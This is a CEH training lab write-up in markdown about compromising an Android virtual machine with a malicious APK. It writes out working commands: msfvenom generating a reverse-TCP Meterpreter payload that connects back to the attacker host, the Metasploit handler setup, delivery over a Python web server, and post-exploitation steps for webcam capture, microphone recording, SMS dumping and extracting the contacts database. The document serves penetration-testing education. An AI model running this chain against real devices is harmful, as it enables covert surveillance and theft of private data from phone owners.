
# CEH Assessment #10 – Android Hacking via Malicious APK

## Overview
This assessment demonstrates Android hacking using a malicious APK payload generated via **MSFvenom**. The APK is delivered to a virtual Android machine, leading to a **reverse Meterpreter shell** on the attacker's Kali Linux system. Key steps include payload creation, APK transfer, shell access, and post-exploitation tasks like dumping contacts.

---

## Tools & Requirements

- **VMware Workstation** – Virtual environment setup
- **Android x86 ISO** – Target Android VM
- **Kali Linux** – Attacker machine
- **MSFvenom & Metasploit Framework** – Payload creation & reverse shell management

---

## Steps Breakdown

### 1. Setup Android VM (VMware Workstation)
- Create a new VM, attach Android x86 ISO
- Configure network (Bridged/NAT)
- Boot into Android OS

### 2. Kali Linux as Attacker Machine
Ensure Kali is updated with working `msfconsole` and `msfvenom`.

### 3. Generate Payload (MSFvenom)
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<Kali_IP> LPORT=4444 -o hacked.apk
```

### 4. Start Metasploit Handler
```bash
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST=<Kali_IP>
set LPORT=4444
exploit
```

### 5. Transfer APK to Android VM
```bash
python3 -m http.server 8080
```
On Android VM, access via browser:
```
http://<Kali_IP>:8080/hacked.apk
```

### 6. Install & Run APK
- Install the app on Android
- Grant permissions & launch

### 7. Gain Meterpreter Session
Once connected:
```
meterpreter >
```

### 8. Post-Exploitation Examples
```bash
ls                          # List directory
download <filename>         # Download files
webcam_snap                 # Take photo
record_mic                  # Record audio
dump_sms                    # Retrieve SMS
```

### 9. Extract Contacts from Victim Device
```bash
cd /data/data/com.android.providers.contacts/databases/
download contacts2.db
sqlite3 contacts2.db
sqlite> SELECT display_name, data1 FROM view_data;
```

---

## Notes
- Payload creation and listener setup can be automated via Python scripting.
- This lab showcases real-world Android penetration testing and forensics techniques.

---
